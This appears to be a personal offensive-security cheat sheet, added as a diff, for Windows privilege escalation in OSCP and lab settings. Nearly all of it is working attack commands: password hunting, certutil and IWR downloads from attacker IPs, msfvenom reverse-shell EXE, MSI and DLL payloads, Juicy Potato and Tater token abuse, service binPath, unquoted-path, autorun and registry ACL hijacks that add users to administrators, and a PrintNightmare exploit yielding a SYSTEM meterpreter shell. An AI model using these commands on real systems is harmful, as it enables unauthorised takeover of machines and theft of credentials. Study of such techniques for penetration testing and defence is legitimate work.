@@ -1,0 +1,351 @@
+# Windows privilege escalation - zero_or_1
+
+- https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+
+## First machine enumeration :- 
+
+--------------------------------------------------
+1. system enumeration :- 
+
+systeminfo ==> all machine information 
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"  ==> return just these 3 things 
+hostname ==> to return hostname 
+wmic qfe ==> extract patches and fixes
+wmic qfe get Caption,Description,HotFixID,InsatlledOn ==> nice and clear patches list 
+wmic logicaldisk get Caption,Description,Providername ==> Get the all disks in the machine 
+
+
+2. Users enumeration :- 
+
+whoami ==> my user "Maybe also we are just in a service not user account"
+whoami /priv ==> my user privileges 
+whoami /groups ==> my user groups 
+
+net user ===> list the user on the machine 
+net user $username ==> information about the specific user , his groups and ..etc
+net localgroup ===> to list the local groups 
+net localgroup $groupName ==> to get information about specific group 
+
+
+3. Network enumeration :- 
+
+ipconfig ===> information about the machine network 
+ipconfig /all ==> more information about the network 
+arp -a ===> arp table ,get my network IP and private cast ip and all ip's 
+route print ==> where my machine communicate 
+netstat -ano ===> where we communicating and in what port , and internal services 
+
+
+4.some password hunting :- 
+
+findstr /si password *.txt *.ini *.config 
+- Some cool commands here in the clear password section : https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+- Some cool commands on Looing for password section : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords
+
+
+5. AV/Firewalls enumeration :- 
+
+sc query windefend ==> information about windows defender 
+sc queryex type= service ===> all the services running in the machine and also firewalls 
+netsh advfirewall firewall dump ==> dump firewalls 
+netsh firewall show state ==> what is the firewall state
+netsh firewall show config ===> show configurations and see what open ports 
+--------------------------------------------------
+
+## Second Automation tools :- 
+1. winPEAS
+2. windows exploit suggester 
+3. PrivEscChecker
+
+--------------------------------------------------
+
+## Third , Privilege Escalation techniques :- 
+
+
+
+1. kernel Exploits :- 
+
+https://github.com/SecWiki/windows-kernel-exploits
+we can use windows exploit suggester with hos databse and copy the systeminfo to file and give it to the windows exploit suggester , then try exploits 
+we can copy the exploit from our machine using certutil 
+certutil -urlcache -f http://$ip:$port/exploit.exe myexploit.exe 
+
+
+
+2. Escalation via WSL "windows subsystem for linux" :- allows u to create bind shell on any port
+
+- where /R c:\windows bash.exe ===> to get the bash.exe file location , I can run it and get sh shell
+- where /R c:\windows wsl.exe  ===> to find the wsl.exe file 
+- /path/to/wsl.exe whoami  ==> should return root 
+- /path/to/wsl.exe python -c "python reverse shell here" or if there is bash just run it 
+- tty escape 
+- if there's any passwords found u can try to connect through impacket psexec or smbexec 
+smbexec administrator:'$password'@$ip
+
+
+
+3. Token Impersonation :- 
+
+https://steflan-security.com/linux-privilege-escalation-token-impersonation/
+https://systemweakness.com/privilege-escalation-using-token-impersonation-windows-5d54404ed488
+
+juicy potato tool x64
+https://github.com/ohpe/juicy-potato/releases
+
+juicy potato x32
+https://github.com/ivanitlearning/Juicy-Potato-x86/releases
+
+CLSID lists for option -c in juicy potato , set it with the system version 
+https://github.com/ohpe/juicy-potato/tree/master/CLSID
+
+Tokens like cookies for computers
+they're 2 types 
+delegate , created for logging into a machine or using remote desktop 
+impersonate , non-intractive such as attaching network drive or domain logon script 
+- if we can list tokens and see an administrator token , or in AD we can dump LSA with Mimikatz and get the kerberos hash and create golden tickets and ..etc 
+- use whoami /priv to list privilages , we may have a SeImpersonatePrivilege , SeAssignPrimaryToken
+see impersonation privileges in PayloadAllThings 
+
+4. continue : Potato Attacks :- 
+
+after getting a foothold into the machine and see the privileges we want , we can check also with windows exploit suggester and feed it the systeminfo to see if we have potato attacks 
+!! all the time we must try the potato attack first !!
+if we are in metasploit we can run the local exploit suggester and choose the exploit 
+after run it we can do : -
+- load icognito 
+- list_tokens -u 
+ and we will see nt authority there
+- impersonate_token "NT AUTHORITY\SYSTEM" 
+* we can hide data using via data stream 
+dir /R
+file.txt:root.txt:$DATA
+more file.txt:root.txt:$DATA
+and we will get the flag 
+
+
+
+--> Exploitation using tater.ps1
+
+
+- In command prompt type: powershell.exe -nop -ep bypass
+- In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
+- In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+- To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
+
+
+
+
+5. getsystem Escalation :- 
+
+if it's worked in a machine  
+getsystem 
+and we will get a shell as NT ATUHORITY 
+https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/
+be carefull this may crash the machine and avoid technique 2 also 
+
+
+
+6. Privilege Escalation with RunAs
+
+view stors creds : cmdkey /list
+u can automate this with winpeas : winpeas.exe quiet cmd windowscreds
+we can create a shell.exe reverse shell and transfer it to the machine
+runas /savecred /user:WORKGROUP\administrator "C:\PATH\TO\shell.exe"
+we will get a reverse shell as administrator because we execute the shell as administrator
+
+
+7. Registry : AutoRun escalation :- 
+
+
+(1)
+
+The Autorun programs are usually stored in the Run or RunOnce registry keys, the following command can be used too query this key and identify any of them:
+- reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+The next steps is to verify whether the current user has write access to the .exe file so that it can be replaced with a malicious one. Icacls or Accesschk can be used to identify the permissions of a specific folder or file:
+- icacls [directory/file]
+- Accesschk.exe -accepteula -wuqv [directory/file]
+winPEAS can identify them , also Autoruns.exe system program can identify them
+If we have a read write to the autorun program we can replace it with a reverse shell using msfvenom to generate it .
+We also need to reboot the machine , we can use whoami /priv to see if we had Shutdows privilege 
+do this comman for reboot 
+shutdown /r /t 0
+we will get a connection in our listener 
+
+(2)
+
+- Run the autoruns64.exe and go to the logon tab 
+- check the autorun program path 
+- check if we have file_all_access permission ==> C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\
+-If we have file all access 
+create a reverse shell with same prgoram.exe name and download it using win explorer 
+click save and go to the real program.exe and click on it to replace it :) , dont remove and try to copy , won't work 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe 
+and this for netcat ==> windows/x64/shell_reverse_tcp
+delete the autorun program and replace it with the reverse shell 
+DOne 
+
+
+8. Escalation via AlwaysInstallElevated feature :- 
+
+https://juggernaut-sec.com/alwaysinstallelevated/
+
+enumerate ==> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+			  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+if the AlwaysInstallElevated value is set to 0x1, that means it is enabled on this host!
+
+enumerate using tools ===>  powershell -ep bypass 
+we then must transfer powerUp.ps1 
+curl http://$ip:$port/powerUp.ps1 -o poweUp.ps1
+With the file on disk, we can now use the following two commands to load and execute this script:
+- . .\PowerUp.ps1
+- Invoke-AllChecks
+we can also use winPEAS
+
+exploit no gui:
+- cmd.exe /c 'systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"' 
+determine the system is x64 or what , then 	
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=9001 -a x64 --platform Windows -f msi -o evil.msi
+we can transfer it ==> IWR -Uri http://172.16.1.30/evil.msi -OutFile evil.msi
+listener on 9001 port 
+copy evil.msi to C:\TEMP 
+msiexec.exe /quiet /qn /i C:\Temp\setup.msi ==> to execute 
+we should recive a reverse shell with nt Authority 
+we can also exploit using gui , reference in the url upove 
+
+
+
+9. vai registry ACL :- 
+
+https://www.bussink.net/privilege-escalation-via-the-registry/
+first powershell -ep 
+- reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc | fl 
+- powershell -exec bypass -c “Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\regsvc | Format-List”
+if we have : 
+Access : Everyone Allow ReadKey
+NT AUTHORITY\INTERACTIVE **Allow FullControl**
+> we can check also via AccessCheck sysinternals "without powershell"
+- accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+KEY_ALL_ACCESS
+and the last check if service can be restarted
+accesschk.exe /accepteula -ucqv regsvc
+
+then exploit :) :- 
+Change ImagePath to the payload
+- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\payload.exe /f
+- and restart the service
+net stop regsvc
+net start regsvc
+>> we can also exploit it by adding a new user to localAdminsGroup
+
+
+
+10. Escalation via Executable Files :- 
+
+we can automate it with powerUp.ps1
+will prompt in checking service executable and argument permission 
+the service path and name
+- then we can overwrite it with our .exe script that add new user to admins group
+
+copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service Path\filepermservice.exe"
+
+
+
+11. Escalation via startup applications : -
+
+* winPEAS can identify this also 
+
+- icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 
+- If “BUILTIN\Users” group has full access ‘(F)’ to the directory 
+- we can genrate a payload.exe and replace it in the ==> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 
+- then logoff and login and we are root 
+
+12. Escalation via DLL hijacking :-
+
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
+most common way is to run procman "process montring filter"
+https://steflan-security.com/windows-privilege-escalation-dll-hijacking/
+
+result -- contains -- "not found"
+Path   -- end with -- ".dll"
+
+If you are looking for missing dlls in general you leave this running for some seconds.
+If you are looking for a missing dll inside an specific executable you should set another filter like "Process Name" "contains" "<exec name>", execute it, and stop capturing events.
+
+- Exploit :- 
+In order to escalate privileges, the best chance we have is to be able to write a dll that a privilege process will try to load in some of place where it is going to be searched. Therefore, we will be able to write a dll in a folder where the dll is searched before the folder where the original dll is (weird case), or we will be able to write on some folder where the dll is going to be searched and the original dll doesn't exist on any folder.
+
+best way is Find a process that runs/will run as with other privileges (horizontal/lateral movement) that is missing a dll.
+Have write permission on any folder where the dll is going to be searched (probably the executable directory or some folder inside the system path), and replace it with malicious one "with msfvenom"
+
+- If GUI access is not an option, enumeration can still be performed using manual commands links upove, Or just use winPEAS 
+
+
+13. escalation via binPath :-
+
+- Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
+- Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.
+
+-> Exploitation
+
+- In command prompt type: sc config daclsvc binpath= "net localgroup administrators user /add"
+- In command prompt type: sc start daclsvc
+- It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+14. Escalation via Unquoted Service Paths :- 
+
+- Open command prompt and type: sc qc unquotedsvc
+- Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.
+   Exploitation :- 
+-> Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+-> Copy the generated file, common.exe, to the Windows VM.
+-> Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
+-> Open command prompt and type: sc start unquotedsvc 
+-> It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+
+
+15. Print NightMare :- 
+
+- Best explain and much easier exploitation here => https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html 
+
+
+Manual :- 
+
+first check if the target vulanerable to the exploit :- 
+-> rpcdump.py @10.10.214.151 | egrep 'MS-RPRN|MS-PAR' 
+the output must be like 
+Protocol: [MS-RPRN]: Print System Remote Protocol 
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
+
+Exploit : 
+
+- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o malicious.dll
+- Listening via metasploit :- 
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lhost VALUE 
+    set lport VALUE
+
+- set a smbserver share to share the malicious.dll 
+- run the exploit with credentials 
+
+python CVE-2021-1675.py THMdepartment.local/james:password@10.10.214.151 '\\192.168.0.100\share\malicious.dll'
+
+will get the reverse shell in metasploit as nt authority\system
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
